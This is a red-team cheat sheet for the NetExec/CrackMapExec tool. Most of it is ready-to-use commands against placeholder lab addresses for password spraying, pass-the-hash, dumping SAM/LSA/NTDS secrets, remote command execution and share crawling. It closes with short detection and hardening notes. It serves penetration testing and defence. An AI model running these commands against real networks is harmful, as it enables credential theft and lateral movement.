---
title: "NetExec / CrackMapExec"
category: "red-team"
tags: ["tools", "active-directory", "smb"]
platform: "windows"
mitre: ["T1021", "T1087"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# NetExec (nxc) / CrackMapExec

## TL;DR
The Swiss Army knife for AD networks: enumeration, spray, remote execution, secret dumping over SMB/WinRM/LDAP/MSSQL/RDP. `nxc` is the maintained successor to CME.

## Enumeration
```bash
# Who's alive + SMB signing level (relay!)
nxc smb 10.10.10.0/24
# Authenticated – shares, users, pass policy
nxc smb 10.10.10.10 -u user -p 'Pass' --shares
nxc smb 10.10.10.10 -u user -p 'Pass' --users --pass-pol
nxc smb 10.10.10.10 -u user -p 'Pass' --loggedon-users
```

## Credentials
```bash
# Password spray (mind lockout)
nxc smb 10.10.10.0/24 -u users.txt -p 'Season2026!' --continue-on-success
# Pass-the-Hash
nxc smb 10.10.10.10 -u administrator -H <NThash> --local-auth
# Dumps
nxc smb 10.10.10.10 -u administrator -p 'Pass' --sam --lsa
nxc smb 10.10.10.10 -u administrator -p 'Pass' -M ntdsutil   # DCSync/NTDS on a DC
```

## Execution / modules
```bash
nxc smb 10.10.10.10 -u administrator -p 'Pass' -x "whoami"      # cmd
nxc winrm 10.10.10.10 -u administrator -p 'Pass' -X "$PSVersionTable"  # ps
nxc ldap 10.10.10.10 -u user -p 'Pass' --bloodhound -c All --dns-server 10.10.10.10
nxc smb 10.10.10.10 -u user -p 'Pass' -M spider_plus           # crawl shares
```

## Detection (Blue Team)
- Mass SMB/WinRM logons from one source, ADMIN$/C$ access, a wave of 4624/4625.
- `--sam/--lsa` → LSASS/registry access; NTDS dump on a DC (4662, VSS).

## Mitigation / Hardening
- SMB signing (blocks relay), LAPS, tiering, restrict remote admin.
- Alert on mass authentications and access to administrative shares.

## Sources
- [NetExec](https://github.com/Pennyw0rth/NetExec)
